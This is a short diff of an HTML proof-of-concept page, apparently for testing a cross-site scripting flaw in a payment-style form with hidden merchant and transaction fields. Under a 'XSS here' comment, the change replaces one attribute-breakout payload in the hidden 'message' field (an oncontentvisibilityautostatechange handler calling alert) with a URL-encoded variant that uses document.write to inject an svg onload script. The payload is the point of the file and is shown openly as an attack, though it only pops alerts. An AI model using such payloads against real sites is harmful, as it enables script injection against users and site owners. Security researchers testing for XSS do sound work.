@@ -49,7 +49,7 @@
       <input type="hidden" name="req_merchant_descriptor" value="1" />
 
       <!-- XSS here -->
-      <input type="hidden" name="message" value="test&apos;&#32;oncontentvisibilityautostatechange&#61;alert&#40;document.domain&#41;&#32;style&#61;&apos;content&#45;visibility&#58;auto" />
+      <input type="hidden" name="message" value="test%27+oncontentvisibilityautostatechange%3Ddocument.write('\u003csvg/onload=alert(1);\u003e')+style%3D%27content-visibility%3Aauto" />
 
       <input type="hidden" name="signed_field_names" value="1" />
       <input type="hidden" name="req_transaction_uuid" value="1" />
